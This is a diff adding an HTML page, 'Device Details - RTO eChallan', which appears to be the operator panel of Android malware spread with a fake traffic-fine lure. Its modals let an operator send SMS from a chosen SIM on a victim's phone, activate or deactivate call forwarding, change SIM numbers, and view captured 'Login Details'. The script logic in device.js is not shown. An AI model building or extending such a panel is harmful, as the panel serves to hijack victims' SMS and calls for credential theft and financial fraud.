@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Details - RTO eChallan</title>
+  <link rel="stylesheet" href="css/main.css">
+</head>
+<body>
+  <div class="bg-orb orb-1"></div>
+  <div class="bg-orb orb-2"></div>
+  <div class="bg-orb orb-3"></div>
+
+  <div class="app-header">
+    <div>
+      <h2>📱 DEVICE DETAILS</h2>
+      <div class="user-info" id="userEmail">...</div>
+    </div>
+    <button class="btn-logout" onclick="location.href='dashboard.html'">← Back</button>
+  </div>
+
+  <div class="container">
+    <div id="content">
+      <div class="loading">Loading device</div>
+    </div>
+  </div>
+
+  <!-- Send SMS Modal -->
+  <div class="modal-overlay" id="modalSms">
+    <div class="modal">
+      <h3>💬 Send SMS</h3>
+      <p class="modal-sub">Quickly send message to any number</p>
+
+      <label style="font-size:11px;font-weight:700;color:#94a3b8;letter-spacing:1.5px;text-transform:uppercase;">Select SIM</label>
+      <div class="sim-selector" style="margin-top:10px;">
+        <div class="sim-option active" onclick="selectSim('sms', 1)">SIM 1</div>
+        <div class="sim-option" onclick="selectSim('sms', 2)">SIM 2</div>
+      </div>
+
+      <div class="input-group">
+        <label>Number (without +91)</label>
+        <input type="tel" id="smsNumber" placeholder="Enter number" maxlength="15">
+      </div>
+      <div class="input-group">
+        <label>Message</label>
+        <textarea id="smsMessage" rows="3" placeholder="Enter message" maxlength="150"></textarea>
+        <div style="text-align:right;font-size:11px;color:#64748b;margin-top:6px;" id="smsCounter">0/150</div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalSms')">Cancel</button>
+        <button class="btn-primary" onclick="sendSMS()">Send →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Call Forward Modal -->
+  <div class="modal-overlay" id="modalCallFwd">
+    <div class="modal">
+      <h3>📞 Call Forwarding</h3>
+
+      <div class="sim-selector">
+        <div class="sim-option active" onclick="selectSim('cf', 1)">SIM 1</div>
+        <div class="sim-option" onclick="selectSim('cf', 2)">SIM 2</div>
+      </div>
+
+      <div class="input-group">
+        <label>Forward To Number</label>
+        <input type="tel" id="cfNumber" placeholder="Number" maxlength="15">
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px;">
+        <button class="btn-success" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;letter-spacing:1px;cursor:pointer;" onclick="sendCallForward('activate')">ACTIVATE</button>
+        <button class="btn-danger" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;letter-spacing:1px;cursor:pointer;" onclick="sendCallForward('deactivate')">DEACTIVATE</button>
+      </div>
+      <button class="btn-warning" style="width:100%;padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;letter-spacing:1px;cursor:pointer;margin-top:10px;" onclick="sendCallForward('check_status')">CHECK STATUS</button>
+
+      <div class="modal-actions" style="margin-top:14px;">
+        <button class="btn-secondary" onclick="closeModal('modalCallFwd')">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Update SIM Modal -->
+  <div class="modal-overlay" id="modalSim">
+    <div class="modal">
+      <h3>📶 Update SIM Numbers</h3>
+      <div class="input-group">
+        <label>SIM 1 Number</label>
+        <input type="tel" id="sim1Input" placeholder="+91XXXXXXXXXX">
+      </div>
+      <div class="input-group">
+        <label>SIM 2 Number</label>
+        <input type="tel" id="sim2Input" placeholder="+91XXXXXXXXXX">
+      </div>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalSim')">Cancel</button>
+        <button class="btn-primary" onclick="updateSim()">Update</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login Details Modal -->
+  <div class="modal-overlay" id="modalLoginDetails">
+    <div class="modal">
+      <h3>🔐 Login Details</h3>
+      <div id="loginDetailsContent">Loading...</div>
+      <div class="modal-actions" style="margin-top:14px;">
+        <button class="btn-secondary" onclick="closeModal('modalLoginDetails')">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <script src="js/firebase-config.js"></script>
+  <script src="js/device.js"></script>
+</body>
+</html>
